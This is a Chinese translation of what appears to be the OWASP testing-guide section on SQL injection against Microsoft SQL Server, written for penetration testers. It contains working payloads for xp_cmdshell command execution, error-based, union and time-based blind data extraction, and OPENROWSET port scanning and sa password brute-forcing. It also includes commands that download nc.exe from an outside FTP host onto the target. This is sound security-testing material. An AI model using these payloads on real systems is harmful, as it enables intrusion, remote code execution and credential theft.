# 测试 SQL Server

## 概述

本节将讨论一些利用 Microsoft SQL Server 特定功能的 [SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection) 技术。

当输入在构造 SQL 查询时未经过充分约束或清理时，就会出现 SQL 注入漏洞。使用动态 SQL（通过字符串拼接构造 SQL 查询）为这些漏洞打开了大门。SQL 注入允许攻击者访问 SQL 服务器，并在用于连接数据库的用户权限下执行 SQL 代码。

如 [SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection) 中所述，SQL 注入利用需要两样东西：一个入口点和一个利用手段。应用程序处理的任何用户可控参数都可能隐藏漏洞。这包括：

- 查询字符串中的应用程序参数（例如 GET 请求）
- POST 请求正文中包含的应用程序参数
- 浏览器相关信息（例如 user-agent、referrer）
- 主机相关信息（例如主机名、IP）
- 会话相关信息（例如用户 ID、cookie）

Microsoft SQL Server 具有一些独特特性，因此某些利用需要为此应用程序特别定制。

## 如何测试

### SQL Server 特性

首先，让我们了解一些在 SQL 注入测试中有用的 SQL Server 运算符和命令/存储过程：

- 注释运算符：`--`（用于强制查询忽略原始查询的剩余部分；并非在所有情况下都需要）
- 查询分隔符：`;`（分号）
- 有用的存储过程包括：
    - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) 以当前运行权限在服务器中执行任何命令 shell。默认情况下，只有 `sysadmin` 允许使用它，在 SQL Server 2005 中默认禁用（可以使用 sp_configure 重新启用）
    - `xp_regread` 从注册表中读取任意值（未记录的扩展存储过程）
    - `xp_regwrite` 向注册表写入任意值（未记录的扩展存储过程）
    - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) 生成 Windows 命令 shell 并传入字符串执行。任何输出以文本行形式返回。需要 `sysadmin` 权限。
    - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) 向指定收件人发送电子邮件，邮件可包含查询结果集附件。此扩展存储过程使用 SQL Mail 发送消息。

现在让我们看一些使用上述函数的 SQL Server 特定攻击示例。大多数示例将使用 `exec` 函数。

下面我们展示如何执行 shell 命令，将命令 `dir c:\inetpub` 的输出写入一个可浏览的文件，假设 Web 服务器和数据库服务器位于同一主机上。以下语法使用 `xp_cmdshell`：

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

或者，我们可以使用 `sp_makewebtask`：

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

成功执行将创建一个可由渗透测试人员浏览的文件。请记住 `sp_makewebtask` 已弃用，即使它在 SQL Server 2005 及之前版本中可用，未来也可能被移除。

此外，SQL Server 内置函数和环境变量非常方便。以下使用函数 `db_name()` 触发错误，返回数据库名称：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

注意使用 [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017)：

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` 会尝试将 `db_name` 的结果（字符串）转换为整数变量，触发错误，如果漏洞应用程序显示该错误，则其中将包含数据库名称。

以下示例使用环境变量 `@@version`，结合 `union select` 注入，以查找 SQL Server 版本。

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

同样使用转换技巧的相同攻击：

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

信息收集对于通过 SQL 注入攻击或直接访问 SQL 监听器来利用 SQL Server 软件漏洞非常有用。

下面我们展示几个通过不同入口点利用 SQL 注入漏洞的示例。

### 示例 1：在 GET 请求中测试 SQL 注入

最简单（有时也是最有效）的情况是登录页面要求输入用户名和密码。您可以尝试输入以下字符串 `' or '1'='1`（不带双引号）：

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

如果应用程序使用动态 SQL 查询，并且该字符串被附加到用户凭据验证查询中，则可能导致成功登录应用程序。

### 示例 2：在 GET 请求中测试 SQL 注入

为了了解有多少列：

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### 示例 3：在 POST 请求中测试

SQL 注入，HTTP POST 内容：`email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

完整 POST 示例（`https://vulnerable.web.app/forgotpass.asp`）：

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

在 email 字段输入 `'`（单引号）字符时获得的错误消息为：

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### 示例 4：另一个（有用的）GET 示例

获取应用程序源代码：

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### 示例 5：自定义 `xp_cmdshell`

所有描述 SQL Server 安全最佳实践的书籍和论文都建议在 SQL Server 2000 中禁用 `xp_cmdshell`（在 SQL Server 2005 中默认禁用）。但是，如果我们拥有 sysadmin 权限（原生拥有或通过暴力破解 sysadmin 密码获得，见下文），我们通常可以绕过此限制。

在 SQL Server 2000 上：

- 如果 `xp_cmdshell` 已被 `sp_dropextendedproc` 禁用，我们可以注入以下代码：

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- 如果上述代码不起作用，则说明 `xp_log70.dll` 已被移动或删除。在这种情况下，我们需要注入以下代码：

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

此代码由 Antonin Foller 编写（见页面底部链接），使用 `sp_oacreate`、`sp_oamethod` 和 `sp_oadestroy` 创建一个新的 `xp_cmdshell`（当然，前提是这些过程也未被禁用）。使用之前，我们需要删除已创建的第一个 `xp_cmdshell`（即使它不工作），否则两个声明将冲突。

在 SQL Server 2005 上，可以通过注入以下代码来启用 `xp_cmdshell`：

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### 示例 6：Referer / User-Agent

将 `REFERER` 头设置为：

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

允许执行任意 SQL 代码。同样的情况也适用于将 User-Agent 头设置为：

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### 示例 7：SQL Server 作为端口扫描器

在 SQL Server 中，最有用的命令之一（至少对渗透测试人员而言）是 OPENROWSET，用于在另一个数据库服务器上运行查询并检索结果。渗透测试人员可以使用此命令扫描目标网络中其他机器的端口，注入以下查询：

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

此查询将尝试连接到地址 x.y.w.z 上的端口 p。如果端口关闭，将返回以下消息：

`SQL Server does not exist or access denied`

另一方面，如果端口打开，将返回以下错误之一：

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

当然，错误消息并不总是可用。如果这样，我们可以使用响应时间来了解发生了什么：对于关闭的端口，超时（本例中为 5 秒）将被消耗，而打开的端口将立即返回结果。

请记住，OPENROWSET 在 SQL Server 2000 中默认启用，但在 SQL Server 2005 中禁用。

### 示例 8：上传可执行文件

一旦我们可以使用 `xp_cmdshell`（原生或自定义的），我们就可以轻松地将可执行文件上传到目标数据库服务器。一个非常常见的选择是 `netcat.exe`，但任何木马在这里都很有用。如果目标被允许向测试人员的机器发起 FTP 连接，只需注入以下查询：

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

此时，`nc.exe` 将被上传并可用的。

如果防火墙不允许 FTP，我们有一个变通方法，利用 Windows 调试器 `debug.exe`，该工具默认安装在所有 Windows 机器上。`Debug.exe` 是可脚本化的，能够通过执行适当的脚本文件来创建可执行文件。我们需要做的是将可执行文件转换为调试脚本（100% ASCII 文件），逐行上传，最后在其上调用 `debug.exe`。有几种工具可以创建此类调试文件（例如 Ollie Whitehouse 的 `makescr.exe` 和 `toolcrypt.org` 的 `dbgtool.exe`）。因此，要注入的查询如下：

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

此时，我们的可执行文件就在目标机器上，随时可以执行。有一些工具可以自动完成此过程，最著名的是在 Windows 上运行的 `Bobcat` 和在 Unix 上运行的 `Sqlninja`（参见本页底部的工具部分）。

### 当信息未显示时获取信息（带外）

当 Web 应用程序不返回任何信息（如描述性错误消息）时，也并非全无希望（参见[盲 SQL 注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）。例如，可能可以访问源代码（例如因为 Web 应用程序基于开源软件）。然后，渗透测试人员可以利用在 Web 应用程序中离线发现的所有 SQL 注入漏洞。尽管 IPS 可能会阻止其中一些攻击，但最好的方法是：在为此目的创建的测试环境中开发和测试攻击，然后针对被测试的 Web 应用程序执行这些攻击。

其他带外攻击选项如[上面的示例 4](#示例-4另一个有用的get示例)所述。

### 盲 SQL 注入攻击

#### 尝试与错误

或者，也可以碰运气。即攻击者可以假设 Web 应用程序中存在盲 SQL 注入或带外 SQL 注入漏洞。然后选择一个攻击向量（例如 Web 入口），[使用模糊测试向量](../../6-Appendix/C-Fuzz_Vectors.md)对该通道进行测试，并观察响应。例如，如果 Web 应用程序使用查询 `select * from books where title="text entered by the user"` 查找书籍，渗透测试人员可以输入文本：`'Bomba' OR 1=1-`，如果数据未正确验证，查询将执行并返回整个书籍列表。这证明存在 SQL 注入漏洞。渗透测试人员随后可以“操作”查询以评估此漏洞的严重性。

> **_注意：_** 在 SQL 查询中注入条件 OR 1=1 时要小心。虽然这在您注入的初始上下文中可能无害，但应用程序通常会从单个请求中获取数据用于多个不同的查询。如果您的条件到达 UPDATE 或 DELETE 语句，例如，可能导致意外的数据丢失。

#### 如果显示多条错误消息

另一方面，如果没有事先信息，仍然有可能利用任何“隐蔽通道”进行攻击。可能描述性错误消息被阻止，但错误消息仍提供一些信息。例如：

- 在某些情况下，Web 应用程序（实际上是 Web 服务器）可能返回传统的 `500: Internal Server Error`，例如当应用程序返回可能由未闭合引号的查询引发的异常时。
- 而在其他情况下，服务器将返回 `200 OK` 消息，但 Web 应用程序会返回开发人员插入的某些错误消息，如 `Internal server error` 或 `bad data`。

这一位信息可能足以理解动态 SQL 查询是如何由 Web 应用程序构造的，并调整利用方法。另一种带外方法是通过 HTTP 可浏览文件输出结果。

#### 时间攻击

当应用程序没有可见反馈时，还有一种可能进行盲 SQL 注入攻击：通过测量 Web 应用程序响应请求所花费的时间。这种攻击在 [Anley](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) 中有描述，我们从中摘取下一个示例。一种典型的方法使用 `waitfor delay` 命令：假设攻击者想检查 `pubs` 示例数据库是否存在，只需注入以下命令：

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

根据查询返回所需的时间，我们将知道答案。事实上，我们这里有两样东西：一个 `SQL 注入漏洞` 和一个 `隐蔽通道`，允许渗透测试人员为每个查询获取 1 比特信息。因此，使用多个查询（与所需信息中的比特数相同），渗透测试人员可以获取数据库中的任何数据。查看以下查询：

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

通过测量响应时间并使用不同的 `@i` 值，我们可以推断当前数据库名称的长度，然后开始使用以下查询提取名称本身：

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

如果当前数据库名称的第 `@byte` 字节的第 `@bit` 位为 1，则此查询将等待 5 秒，如果为 0，则立即返回。嵌套两个循环（一个用于 `@byte`，一个用于 `@bit`），我们将能够提取整个信息。

然而，可能 `waitfor` 命令不可用（例如，因为被 IPS/Web 应用防火墙过滤）。这并不意味着无法进行盲 SQL 注入攻击，因为渗透测试人员只需想出一个未被过滤的耗时操作即可。例如：

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### 检查版本和漏洞

相同的时间方法也可用于了解我们正在处理哪个 SQL Server 版本。当然，我们将利用内置变量 `@@version`。考虑以下查询：

`select @@version`

在 SQL Server 2005 上，将返回类似以下内容：

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

`2005` 部分从第 22 到第 25 个字符。因此，可以注入以下查询：

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

如果 `@@version` 变量的第 25 个字符是 `5`，则此查询将等待 5 秒，表明我们正在处理 SQL Server 2005。如果查询立即返回，则我们可能正在处理 SQL Server 2000，另一个类似的查询将有助于消除所有疑虑。

### 示例 9：暴力破解 Sysadmin 密码

要暴力破解 sysadmin 密码，我们可以利用 `OPENROWSET` 需要正确凭据才能成功连接，并且该连接也可以“循环”到本地数据库服务器。结合基于响应时间的推理注入攻击，我们可以注入以下代码：

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

这里我们尝试使用 `sa` 和 `<pwd>` 作为凭据连接到本地数据库（由 `SQLOLEDB` 后的空字段指定）。如果密码正确且连接成功，则执行查询，使数据库等待 5 秒（并返回一个值，因为 OPENROWSET 期望至少一列）。从字典中获取候选密码并测量每次连接所需的时间，我们可以尝试猜测正确的密码。在“使用 SQL 注入和推理进行数据挖掘”中，David Litchfield 将此技术更进一步，通过注入一段代码，利用数据库服务器自身的 CPU 资源来暴力破解 sysadmin 密码。

一旦我们获得 sysadmin 密码，我们有两个选择：

- 使用 `OPENROWSET` 注入所有后续查询，以使用 sysadmin 权限
- 使用 `sp_addsrvrolemember` 将当前用户添加到 sysadmin 组。当前用户名可以通过对 `system_user` 变量进行推理注入来提取。

请记住，OPENROWSET 在 SQL Server 2000 上对所有用户可访问，但在 SQL Server 2005 上仅限于管理账户。
